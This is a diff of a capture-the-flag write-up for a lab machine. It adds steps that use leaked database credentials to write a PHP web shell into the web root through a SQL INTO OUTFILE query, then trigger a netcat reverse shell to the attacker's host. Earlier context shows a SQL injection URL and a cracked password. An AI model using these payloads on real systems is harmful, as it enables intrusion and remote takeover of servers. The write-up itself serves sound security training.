@@ -196,8 +196,6 @@ http://10.10.10.143/room.php?cod=55+union+select+1,2,(SELECT group_concat(User,"
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/982a4737-3951-4842-9cf8-5cba91bff2d8)
 
-
-
 + Crack the hash with [crackstation](https://crackstation.net/), and credentials: `DBadmin`:`imissyou`.
 ```
 DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
@@ -205,6 +203,9 @@ DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b0d83de8-95eb-4884-a745-25fe68550d89)
 
+
+
+## Gaining Access: Method 1
 + Get into the phpmyadmin site with the discovered credentials: `http://10.10.10.143/phpmyadmin/`
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/456d2ac4-4fe4-4dd2-adf1-fe2ed4706eeb)
@@ -220,16 +221,20 @@ DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/658da495-e482-42e9-a463-b695e97e7f4f)
 
++ Run a SQL statement getting some php code I want to run on the site: `SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/cmd.php"`
 
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2665c910-1105-4e8b-a6d5-10ad9567f15c)
 
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c36c1f3e-d8d5-479c-b2a0-7e95bc88f66e)
 
++ And then visit `http://10.10.10.143/cmd.php?cmd=id`.
 
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/15d4bb2e-bf8a-4c48-b27a-4699a2d620b0)
 
++ Trigger to get the shell `http://10.10.10.143/cmd.php?cmd=nc -e /bin/sh 10.10.14.8 4444`.
++ Get low level shell, and see the **web daemon user (www-data)**'s privilege is **not** enough to view the content of the user flag.
 
-
-
-## Gaining Access
-+ xxx
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/12d48b82-8ec8-4d18-93a4-93d10aff2aa7)
 
 
 
@@ -246,6 +251,10 @@ export TERM=xterm
 export SHELL=bash
 stty rows 55 columns 285
 ```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/de4bb263-c2f6-441f-956b-5a804e06f2cc)
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8e20f12b-ee11-4c9e-b4c8-532563c5f795)
 
 
 
